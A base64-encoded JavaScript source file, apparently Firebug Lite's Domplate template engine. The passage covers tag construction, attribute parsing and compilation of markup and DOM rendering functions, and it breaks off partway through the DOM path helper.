PSBmdW5jdGlvbiBEb21wbGF0ZUxvb3AoKQ0Kew0KfTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdmFyIERvbXBsYXRlVGFnID0gRkJMLkRvbXBsYXRlVGFnOw0KdmFyIERvbXBsYXRlRW1iZWQgPSBGQkwuRG9tcGxhdGVFbWJlZDsNCnZhciBEb21wbGF0ZUxvb3AgPSBGQkwuRG9tcGxhdGVMb29wOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgd29tYiA9IG51bGw7DQoNCkZCTC5kb21wbGF0ZSA9IGZ1bmN0aW9uKCkNCnsNCiAgICB2YXIgbGFzdFN1YmplY3Q7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcmd1bWVudHMubGVuZ3RoOyArK2kpDQogICAgICAgIGxhc3RTdWJqZWN0ID0gbGFzdFN1YmplY3QgPyBjb3B5T2JqZWN0KGxhc3RTdWJqZWN0LCBhcmd1bWVudHNbaV0pIDogYXJndW1lbnRzW2ldOw0KDQogICAgZm9yICh2YXIgbmFtZSBpbiBsYXN0U3ViamVjdCkNCiAgICB7DQogICAgICAgIHZhciB2YWwgPSBsYXN0U3ViamVjdFtuYW1lXTsNCiAgICAgICAgaWYgKGlzVGFnKHZhbCkpDQogICAgICAgICAgICB2YWwudGFnLnN1YmplY3QgPSBsYXN0U3ViamVjdDsNCiAgICB9DQoNCiAgICByZXR1cm4gbGFzdFN1YmplY3Q7DQp9Ow0KDQp2YXIgZG9tcGxhdGUgPSBGQkwuZG9tcGxhdGU7DQoNCkZCTC5kb21wbGF0ZS5jb250ZXh0ID0gZnVuY3Rpb24oY29udGV4dCwgZm4pDQp7DQogICAgdmFyIGxhc3RDb250ZXh0ID0gZG9tcGxhdGUubGFzdENvbnRleHQ7DQogICAgZG9tcGxhdGUudG9wQ29udGV4dCA9IGNvbnRleHQ7DQogICAgZm4uYXBwbHkoY29udGV4dCk7DQogICAgZG9tcGxhdGUudG9wQ29udGV4dCA9IGxhc3RDb250ZXh0Ow0KfTsNCg0KRkJMLlRBRyA9IGZ1bmN0aW9uKCkNCnsNCiAgICB2YXIgZW1iZWQgPSBuZXcgRG9tcGxhdGVFbWJlZCgpOw0KICAgIHJldHVybiBlbWJlZC5tZXJnZShhcmd1bWVudHMpOw0KfTsNCg0KRkJMLkZPUiA9IGZ1bmN0aW9uKCkNCnsNCiAgICB2YXIgbG9vcCA9IG5ldyBEb21wbGF0ZUxvb3AoKTsNCiAgICByZXR1cm4gbG9vcC5tZXJnZShhcmd1bWVudHMpOw0KfTsNCg0KRkJMLkRvbXBsYXRlVGFnLnByb3RvdHlwZSA9DQp7DQogICAgbWVyZ2U6IGZ1bmN0aW9uKGFyZ3MsIG9sZFRhZykNCiAgICB7DQogICAgICAgIGlmIChvbGRUYWcpDQogICAgICAgICAgICB0aGlzLnRhZ05hbWUgPSBvbGRUYWcudGFnTmFtZTsNCg0KICAgICAgICB0aGlzLmNvbnRleHQgPSBvbGRUYWcgPyBvbGRUYWcuY29udGV4dCA6IG51bGw7DQogICAgICAgIHRoaXMuc3ViamVjdCA9IG9sZFRhZyA/IG9sZFRhZy5zdWJqZWN0IDogbnVsbDsNCiAgICAgICAgdGhpcy5hdHRycyA9IG9sZFRhZyA/IGNvcHlPYmplY3Qob2xkVGFnLmF0dHJzKSA6IHt9Ow0KICAgICAgICB0aGlzLmNsYXNzZXMgPSBvbGRUYWcgPyBjb3B5T2JqZWN0KG9sZFRhZy5jbGFzc2VzKSA6IHt9Ow0KICAgICAgICB0aGlzLnByb3BzID0gb2xkVGFnID8gY29weU9iamVjdChvbGRUYWcucHJvcHMpIDogbnVsbDsNCiAgICAgICAgdGhpcy5saXN0ZW5lcnMgPSBvbGRUYWcgPyBjb3B5QXJyYXkob2xkVGFnLmxpc3RlbmVycykgOiBudWxsOw0KICAgICAgICB0aGlzLmNoaWxkcmVuID0gb2xkVGFnID8gY29weUFycmF5KG9sZFRhZy5jaGlsZHJlbikgOiBbXTsNCiAgICAgICAgdGhpcy52YXJzID0gb2xkVGFnID8gY29weUFycmF5KG9sZFRhZy52YXJzKSA6IFtdOw0KDQogICAgICAgIHZhciBhdHRycyA9IGFyZ3MubGVuZ3RoID8gYXJnc1swXSA6IG51bGw7DQogICAgICAgIHZhciBoYXNBdHRycyA9IHR5cGVvZihhdHRycykgPT0gIm9iamVjdCIgJiYgIWlzVGFnKGF0dHJzKTsNCg0KICAgICAgICB0aGlzLmNoaWxkcmVuID0gW107DQoNCiAgICAgICAgaWYgKGRvbXBsYXRlLnRvcENvbnRleHQpDQogICAgICAgICAgICB0aGlzLmNvbnRleHQgPSBkb21wbGF0ZS50b3BDb250ZXh0Ow0KDQogICAgICAgIGlmIChhcmdzLmxlbmd0aCkNCiAgICAgICAgICAgIHBhcnNlQ2hpbGRyZW4oYXJncywgaGFzQXR0cnMgPyAxIDogMCwgdGhpcy52YXJzLCB0aGlzLmNoaWxkcmVuKTsNCg0KICAgICAgICBpZiAoaGFzQXR0cnMpDQogICAgICAgICAgICB0aGlzLnBhcnNlQXR0cnMoYXR0cnMpOw0KDQogICAgICAgIHJldHVybiBjcmVhdG9yKHRoaXMsIERvbXBsYXRlVGFnKTsNCiAgICB9LA0KDQogICAgcGFyc2VBdHRyczogZnVuY3Rpb24oYXJncykNCiAgICB7DQogICAgICAgIGZvciAodmFyIG5hbWUgaW4gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHZhbCA9IHBhcnNlVmFsdWUoYXJnc1tuYW1lXSk7DQogICAgICAgICAgICByZWFkUGFydE5hbWVzKHZhbCwgdGhpcy52YXJzKTsNCg0KICAgICAgICAgICAgaWYgKG5hbWUuaW5kZXhPZigib24iKSA9PSAwKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBldmVudE5hbWUgPSBuYW1lLnN1YnN0cigyKTsNCiAgICAgICAgICAgICAgICBpZiAoIXRoaXMubGlzdGVuZXJzKQ0KICAgICAgICAgICAgICAgICAgICB0aGlzLmxpc3RlbmVycyA9IFtdOw0KICAgICAgICAgICAgICAgIHRoaXMubGlzdGVuZXJzLnB1c2goZXZlbnROYW1lLCB2YWwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZiAobmFtZS5pbmRleE9mKCJfIikgPT0gMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgcHJvcE5hbWUgPSBuYW1lLnN1YnN0cigxKTsNCiAgICAgICAgICAgICAgICBpZiAoIXRoaXMucHJvcHMpDQogICAgICAgICAgICAgICAgICAgIHRoaXMucHJvcHMgPSB7fTsNCiAgICAgICAgICAgICAgICB0aGlzLnByb3BzW3Byb3BOYW1lXSA9IHZhbDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKG5hbWUuaW5kZXhPZigiJCIpID09IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGNsYXNzTmFtZSA9IG5hbWUuc3Vic3RyKDEpOw0KICAgICAgICAgICAgICAgIGlmICghdGhpcy5jbGFzc2VzKQ0KICAgICAgICAgICAgICAgICAgICB0aGlzLmNsYXNzZXMgPSB7fTsNCiAgICAgICAgICAgICAgICB0aGlzLmNsYXNzZXNbY2xhc3NOYW1lXSA9IHZhbDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAobmFtZSA9PSAiY2xhc3MiICYmIHRoaXMuYXR0cnMuaGFzT3duUHJvcGVydHkobmFtZSkgKQ0KICAgICAgICAgICAgICAgICAgICB0aGlzLmF0dHJzW25hbWVdICs9ICIgIiArIHZhbDsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHRoaXMuYXR0cnNbbmFtZV0gPSB2YWw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgY29tcGlsZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMucmVuZGVyTWFya3VwKQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIHRoaXMuY29tcGlsZU1hcmt1cCgpOw0KICAgICAgICB0aGlzLmNvbXBpbGVET00oKTsNCg0KICAgICAgICAvL2lmIChGQlRyYWNlLkRCR19ET00pIEZCVHJhY2Uuc3lzb3V0KCJkb21wbGF0ZSByZW5kZXJNYXJrdXA6ICIsIHRoaXMucmVuZGVyTWFya3VwKTsNCiAgICAgICAgLy9pZiAoRkJUcmFjZS5EQkdfRE9NKSBGQlRyYWNlLnN5c291dCgiZG9tcGxhdGUgcmVuZGVyRE9NOiIsIHRoaXMucmVuZGVyRE9NKTsNCiAgICAgICAgLy9pZiAoRkJUcmFjZS5EQkdfRE9NKSBGQlRyYWNlLnN5c291dCgiZG9tcGxhdGUgZG9tQXJnczoiLCB0aGlzLmRvbUFyZ3MpOw0KICAgIH0sDQoNCiAgICBjb21waWxlTWFya3VwOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB0aGlzLm1hcmt1cEFyZ3MgPSBbXTsNCiAgICAgICAgdmFyIHRvcEJsb2NrID0gW10sIHRvcE91dHMgPSBbXSwgYmxvY2tzID0gW10sIGluZm8gPSB7YXJnczogdGhpcy5tYXJrdXBBcmdzLCBhcmdJbmRleDogMH07DQogICAgICAgICANCiAgICAgICAgdGhpcy5nZW5lcmF0ZU1hcmt1cCh0b3BCbG9jaywgdG9wT3V0cywgYmxvY2tzLCBpbmZvKTsNCiAgICAgICAgdGhpcy5hZGRDb2RlKHRvcEJsb2NrLCB0b3BPdXRzLCBibG9ja3MpOw0KDQogICAgICAgIHZhciBmbkJsb2NrID0gWydyPShmdW5jdGlvbiAoX19jb2RlX18sIF9fY29udGV4dF9fLCBfX2luX18sIF9fb3V0X18nXTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBpbmZvLmFyZ0luZGV4OyArK2kpDQogICAgICAgICAgICBmbkJsb2NrLnB1c2goJywgcycsIGkpOw0KICAgICAgICBmbkJsb2NrLnB1c2goJykgeycpOw0KDQogICAgICAgIGlmICh0aGlzLnN1YmplY3QpDQogICAgICAgICAgICBmbkJsb2NrLnB1c2goJ3dpdGggKHRoaXMpIHsnKTsNCiAgICAgICAgaWYgKHRoaXMuY29udGV4dCkNCiAgICAgICAgICAgIGZuQmxvY2sucHVzaCgnd2l0aCAoX19jb250ZXh0X18pIHsnKTsNCiAgICAgICAgZm5CbG9jay5wdXNoKCd3aXRoIChfX2luX18pIHsnKTsNCg0KICAgICAgICBmbkJsb2NrLnB1c2guYXBwbHkoZm5CbG9jaywgYmxvY2tzKTsNCg0KICAgICAgICBpZiAodGhpcy5zdWJqZWN0KQ0KICAgICAgICAgICAgZm5CbG9jay5wdXNoKCd9Jyk7DQogICAgICAgIGlmICh0aGlzLmNvbnRleHQpDQogICAgICAgICAgICBmbkJsb2NrLnB1c2goJ30nKTsNCg0KICAgICAgICBmbkJsb2NrLnB1c2goJ319KScpOw0KDQogICAgICAgIGZ1bmN0aW9uIF9fbGlua19fKHRhZywgY29kZSwgb3V0cHV0cywgYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCF0YWcgfHwgIXRhZy50YWcpDQogICAgICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgICAgICB0YWcudGFnLmNvbXBpbGUoKTsNCg0KICAgICAgICAgICAgdmFyIHRhZ091dHB1dHMgPSBbXTsNCiAgICAgICAgICAgIHZhciBtYXJrdXBBcmdzID0gW2NvZGUsIHRhZy50YWcuY29udGV4dCwgYXJncywgdGFnT3V0cHV0c107DQogICAgICAgICAgICBtYXJrdXBBcmdzLnB1c2guYXBwbHkobWFya3VwQXJncywgdGFnLnRhZy5tYXJrdXBBcmdzKTsNCiAgICAgICAgICAgIHRhZy50YWcucmVuZGVyTWFya3VwLmFwcGx5KHRhZy50YWcuc3ViamVjdCwgbWFya3VwQXJncyk7DQoNCiAgICAgICAgICAgIG91dHB1dHMucHVzaCh0YWcpOw0KICAgICAgICAgICAgb3V0cHV0cy5wdXNoKHRhZ091dHB1dHMpOw0KICAgICAgICB9DQoNCiAgICAgICAgZnVuY3Rpb24gX19lc2NhcGVfXyh2YWx1ZSkNCiAgICAgICAgew0KICAgICAgICAgICAgZnVuY3Rpb24gcmVwbGFjZUNoYXJzKGNoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN3aXRjaCAoY2gpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjYXNlICI8IjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAiJmx0OyI7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgIj4iOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICImZ3Q7IjsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiJiI6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIiZhbXA7IjsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAiJyI6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIiYjMzk7IjsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAnIic6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIiZxdW90OyI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiAiPyI7DQogICAgICAgICAgICB9Ow0KICAgICAgICAgICAgcmV0dXJuIFN0cmluZyh2YWx1ZSkucmVwbGFjZSgvWzw+JiInXS9nLCByZXBsYWNlQ2hhcnMpOw0KICAgICAgICB9DQoNCiAgICAgICAgZnVuY3Rpb24gX19sb29wX18oaXRlciwgb3V0cHV0cywgZm4pDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBpdGVyT3V0cyA9IFtdOw0KICAgICAgICAgICAgb3V0cHV0cy5wdXNoKGl0ZXJPdXRzKTsNCg0KICAgICAgICAgICAgaWYgKGl0ZXIgaW5zdGFuY2VvZiBBcnJheSkNCiAgICAgICAgICAgICAgICBpdGVyID0gbmV3IEFycmF5SXRlcmF0b3IoaXRlcik7DQoNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHdoaWxlICgxKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gaXRlci5uZXh0KCk7DQogICAgICAgICAgICAgICAgICAgIHZhciBpdGVtT3V0cyA9IFswLDBdOw0KICAgICAgICAgICAgICAgICAgICBpdGVyT3V0cy5wdXNoKGl0ZW1PdXRzKTsNCiAgICAgICAgICAgICAgICAgICAgZm4uYXBwbHkodGhpcywgW3ZhbHVlLCBpdGVtT3V0c10pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIChleGMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKGV4YyAhPSBTdG9wSXRlcmF0aW9uKQ0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBleGM7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICB2YXIganMgPSBmbkJsb2NrLmpvaW4oIiIpOw0KICAgICAgICB2YXIgciA9IG51bGw7DQogICAgICAgIGV2YWwoanMpOw0KICAgICAgICB0aGlzLnJlbmRlck1hcmt1cCA9IHI7DQogICAgfSwNCg0KICAgIGdldFZhck5hbWVzOiBmdW5jdGlvbihhcmdzKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMudmFycykNCiAgICAgICAgICAgIGFyZ3MucHVzaC5hcHBseShhcmdzLCB0aGlzLnZhcnMpOw0KDQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy5jaGlsZHJlbi5sZW5ndGg7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGNoaWxkID0gdGhpcy5jaGlsZHJlbltpXTsNCiAgICAgICAgICAgIGlmIChpc1RhZyhjaGlsZCkpDQogICAgICAgICAgICAgICAgY2hpbGQudGFnLmdldFZhck5hbWVzKGFyZ3MpOw0KICAgICAgICAgICAgZWxzZSBpZiAoY2hpbGQgaW5zdGFuY2VvZiBQYXJ0cykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGNoaWxkLnBhcnRzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGNoaWxkLnBhcnRzW2ldIGluc3RhbmNlb2YgVmFyaWFibGUpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBuYW1lID0gY2hpbGQucGFydHNbaV0ubmFtZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBuYW1lcyA9IG5hbWUuc3BsaXQoIi4iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3MucHVzaChuYW1lc1swXSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgZ2VuZXJhdGVNYXJrdXA6IGZ1bmN0aW9uKHRvcEJsb2NrLCB0b3BPdXRzLCBibG9ja3MsIGluZm8pDQogICAgew0KICAgICAgICB0b3BCbG9jay5wdXNoKCcsIjwnLCB0aGlzLnRhZ05hbWUsICciJyk7DQoNCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiB0aGlzLmF0dHJzKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAobmFtZSAhPSAiY2xhc3MiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciB2YWwgPSB0aGlzLmF0dHJzW25hbWVdOw0KICAgICAgICAgICAgICAgIHRvcEJsb2NrLnB1c2goJywgIiAnLCBuYW1lLCAnPVxcIiInKTsNCiAgICAgICAgICAgICAgICBhZGRQYXJ0cyh2YWwsICcsJywgdG9wQmxvY2ssIGluZm8sIHRydWUpOw0KICAgICAgICAgICAgICAgIHRvcEJsb2NrLnB1c2goJywgIlxcIiInKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGlmICh0aGlzLmxpc3RlbmVycykNCiAgICAgICAgew0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmxpc3RlbmVycy5sZW5ndGg7IGkgKz0gMikNCiAgICAgICAgICAgICAgICByZWFkUGFydE5hbWVzKHRoaXMubGlzdGVuZXJzW2krMV0sIHRvcE91dHMpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHRoaXMucHJvcHMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvciAodmFyIG5hbWUgaW4gdGhpcy5wcm9wcykNCiAgICAgICAgICAgICAgICByZWFkUGFydE5hbWVzKHRoaXMucHJvcHNbbmFtZV0sIHRvcE91dHMpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCB0aGlzLmF0dHJzLmhhc093blByb3BlcnR5KCJjbGFzcyIpIHx8IHRoaXMuY2xhc3NlcykNCiAgICAgICAgew0KICAgICAgICAgICAgdG9wQmxvY2sucHVzaCgnLCAiIGNsYXNzPVxcIiInKTsNCiAgICAgICAgICAgIGlmICh0aGlzLmF0dHJzLmhhc093blByb3BlcnR5KCJjbGFzcyIpKQ0KICAgICAgICAgICAgICAgIGFkZFBhcnRzKHRoaXMuYXR0cnNbImNsYXNzIl0sICcsJywgdG9wQmxvY2ssIGluZm8sIHRydWUpOw0KICAgICAgICAgICAgICB0b3BCbG9jay5wdXNoKCcsICIgIicpOw0KICAgICAgICAgICAgZm9yICh2YXIgbmFtZSBpbiB0aGlzLmNsYXNzZXMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdG9wQmxvY2sucHVzaCgnLCAoJyk7DQogICAgICAgICAgICAgICAgYWRkUGFydHModGhpcy5jbGFzc2VzW25hbWVdLCAnJywgdG9wQmxvY2ssIGluZm8pOw0KICAgICAgICAgICAgICAgIHRvcEJsb2NrLnB1c2goJyA/ICInLCBuYW1lLCAnIiArICIgIiA6ICIiKScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgdG9wQmxvY2sucHVzaCgnLCAiXFwiIicpOw0KICAgICAgICB9DQogICAgICAgIHRvcEJsb2NrLnB1c2goJywiPiInKTsNCg0KICAgICAgICB0aGlzLmdlbmVyYXRlQ2hpbGRNYXJrdXAodG9wQmxvY2ssIHRvcE91dHMsIGJsb2NrcywgaW5mbyk7DQogICAgICAgIHRvcEJsb2NrLnB1c2goJywiPC8nLCB0aGlzLnRhZ05hbWUsICc+IicpOw0KICAgIH0sDQoNCiAgICBnZW5lcmF0ZUNoaWxkTWFya3VwOiBmdW5jdGlvbih0b3BCbG9jaywgdG9wT3V0cywgYmxvY2tzLCBpbmZvKQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLmNoaWxkcmVuLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgY2hpbGQgPSB0aGlzLmNoaWxkcmVuW2ldOw0KICAgICAgICAgICAgaWYgKGlzVGFnKGNoaWxkKSkNCiAgICAgICAgICAgICAgICBjaGlsZC50YWcuZ2VuZXJhdGVNYXJrdXAodG9wQmxvY2ssIHRvcE91dHMsIGJsb2NrcywgaW5mbyk7DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgYWRkUGFydHMoY2hpbGQsICcsJywgdG9wQmxvY2ssIGluZm8sIHRydWUpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGFkZENvZGU6IGZ1bmN0aW9uKHRvcEJsb2NrLCB0b3BPdXRzLCBibG9ja3MpDQogICAgew0KICAgICAgICBpZiAodG9wQmxvY2subGVuZ3RoKQ0KICAgICAgICAgICAgYmxvY2tzLnB1c2goJ19fY29kZV9fLnB1c2goIiInLCB0b3BCbG9jay5qb2luKCIiKSwgJyk7Jyk7DQogICAgICAgIGlmICh0b3BPdXRzLmxlbmd0aCkNCiAgICAgICAgICAgIGJsb2Nrcy5wdXNoKCdfX291dF9fLnB1c2goJywgdG9wT3V0cy5qb2luKCIsIiksICcpOycpOw0KICAgICAgICB0b3BCbG9jay5zcGxpY2UoMCwgdG9wQmxvY2subGVuZ3RoKTsNCiAgICAgICAgdG9wT3V0cy5zcGxpY2UoMCwgdG9wT3V0cy5sZW5ndGgpOw0KICAgIH0sDQoNCiAgICBhZGRMb2NhbHM6IGZ1bmN0aW9uKGJsb2NrcykNCiAgICB7DQogICAgICAgIHZhciB2YXJOYW1lcyA9IFtdOw0KICAgICAgICB0aGlzLmdldFZhck5hbWVzKHZhck5hbWVzKTsNCg0KICAgICAgICB2YXIgbWFwID0ge307DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdmFyTmFtZXMubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBuYW1lID0gdmFyTmFtZXNbaV07DQogICAgICAgICAgICBpZiAoIG1hcC5oYXNPd25Qcm9wZXJ0eShuYW1lKSApDQogICAgICAgICAgICAgICAgY29udGludWU7DQoNCiAgICAgICAgICAgIG1hcFtuYW1lXSA9IDE7DQogICAgICAgICAgICB2YXIgbmFtZXMgPSBuYW1lLnNwbGl0KCIuIik7DQogICAgICAgICAgICBibG9ja3MucHVzaCgndmFyICcsIG5hbWVzWzBdICsgJyA9ICcgKyAnX19pbl9fLicgKyBuYW1lc1swXSArICc7Jyk7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgY29tcGlsZURPTTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHBhdGggPSBbXTsNCiAgICAgICAgdmFyIGJsb2NrcyA9IFtdOw0KICAgICAgICB0aGlzLmRvbUFyZ3MgPSBbXTsNCiAgICAgICAgcGF0aC5lbWJlZEluZGV4ID0gMDsNCiAgICAgICAgcGF0aC5sb29wSW5kZXggPSAwOw0KICAgICAgICBwYXRoLnN0YXRpY0luZGV4ID0gMDsNCiAgICAgICAgcGF0aC5yZW5kZXJJbmRleCA9IDA7DQogICAgICAgIHZhciBub2RlQ291bnQgPSB0aGlzLmdlbmVyYXRlRE9NKHBhdGgsIGJsb2NrcywgdGhpcy5kb21BcmdzKTsNCg0KICAgICAgICB2YXIgZm5CbG9jayA9IFsncj0oZnVuY3Rpb24gKHJvb3QsIGNvbnRleHQsIG8nXTsNCg0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHBhdGguc3RhdGljSW5kZXg7ICsraSkNCiAgICAgICAgICAgIGZuQmxvY2sucHVzaCgnLCAnLCAncycraSk7DQoNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwYXRoLnJlbmRlckluZGV4OyArK2kpDQogICAgICAgICAgICBmbkJsb2NrLnB1c2goJywgJywgJ2QnK2kpOw0KDQogICAgICAgIGZuQmxvY2sucHVzaCgnKSB7Jyk7DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgcGF0aC5sb29wSW5kZXg7ICsraSkNCiAgICAgICAgICAgIGZuQmxvY2sucHVzaCgndmFyIGwnLCBpLCAnID0gMDsnKTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwYXRoLmVtYmVkSW5kZXg7ICsraSkNCiAgICAgICAgICAgIGZuQmxvY2sucHVzaCgndmFyIGUnLCBpLCAnID0gMDsnKTsNCg0KICAgICAgICBpZiAodGhpcy5zdWJqZWN0KQ0KICAgICAgICAgICAgZm5CbG9jay5wdXNoKCd3aXRoICh0aGlzKSB7Jyk7DQogICAgICAgIGlmICh0aGlzLmNvbnRleHQpDQogICAgICAgICAgICBmbkJsb2NrLnB1c2goJ3dpdGggKGNvbnRleHQpIHsnKTsNCg0KICAgICAgICBmbkJsb2NrLnB1c2goYmxvY2tzLmpvaW4oIiIpKTsNCg0KICAgICAgICBpZiAodGhpcy5zdWJqZWN0KQ0KICAgICAgICAgICAgZm5CbG9jay5wdXNoKCd9Jyk7DQogICAgICAgIGlmICh0aGlzLmNvbnRleHQpDQogICAgICAgICAgICBmbkJsb2NrLnB1c2goJ30nKTsNCg0KICAgICAgICBmbkJsb2NrLnB1c2goJ3JldHVybiAnLCBub2RlQ291bnQsICc7Jyk7DQogICAgICAgIGZuQmxvY2sucHVzaCgnfSknKTsNCg0KICAgICAgICBmdW5jdGlvbiBfX2JpbmRfXyhvYmplY3QsIGZuKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gZnVuY3Rpb24oZXZlbnQpIHsgcmV0dXJuIGZuLmFwcGx5KG9iamVjdCwgW2V2ZW50XSk7IH07DQogICAgICAgIH0NCg0KICAgICAgICBmdW5jdGlvbiBfX2xpbmtfXyhub2RlLCB0YWcsIGFyZ3MpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICghdGFnIHx8ICF0YWcudGFnKQ0KICAgICAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICAgICAgdGFnLnRhZy5jb21waWxlKCk7DQoNCiAgICAgICAgICAgIHZhciBkb21BcmdzID0gW25vZGUsIHRhZy50YWcuY29udGV4dCwgMF07DQogICAgICAgICAgICBkb21BcmdzLnB1c2guYXBwbHkoZG9tQXJncywgdGFnLnRhZy5kb21BcmdzKTsNCiAgICAgICAgICAgIGRvbUFyZ3MucHVzaC5hcHBseShkb21BcmdzLCBhcmdzKTsNCiAgICAgICAgICAgIC8vaWYgKEZCVHJhY2UuREJHX0RPTSkgRkJUcmFjZS5kdW1wUHJvcGVydGllcygiZG9tcGxhdGVfX2xpbmtfXyBkb21BcmdzOiIsIGRvbUFyZ3MpOw0KICAgICAgICAgICAgcmV0dXJuIHRhZy50YWcucmVuZGVyRE9NLmFwcGx5KHRhZy50YWcuc3ViamVjdCwgZG9tQXJncyk7DQogICAgICAgIH0NCg0KICAgICAgICB2YXIgc2VsZiA9IHRoaXM7DQogICAgICAgIGZ1bmN0aW9uIF9fbG9vcF9fKGl0ZXIsIGZuKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgbm9kZUNvdW50ID0gMDsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgaXRlci5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpdGVyW2ldWzBdID0gaTsNCiAgICAgICAgICAgICAgICBpdGVyW2ldWzFdID0gbm9kZUNvdW50Ow0KICAgICAgICAgICAgICAgIG5vZGVDb3VudCArPSBmbi5hcHBseSh0aGlzLCBpdGVyW2ldKTsNCiAgICAgICAgICAgICAgICAvL2lmIChGQlRyYWNlLkRCR19ET00pIEZCVHJhY2Uuc3lzb3V0KCJub2RlQ291bnQiLCBub2RlQ291bnQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIG5vZGVDb3VudDsNCiAgICAgICAgfQ0KDQogICAgICAgIGZ1bmN0aW9uIF9fcGF0aF9fKHBhcmVudCwgb2Zmc2V0KQ0KICAgICAgICB7DQogICAgICAgICAgICAvL2lmIChGQlRyYWNlLkRCR19ET00pIEZCVHJhY2Uuc3lzb3V0KCJkb21wbGF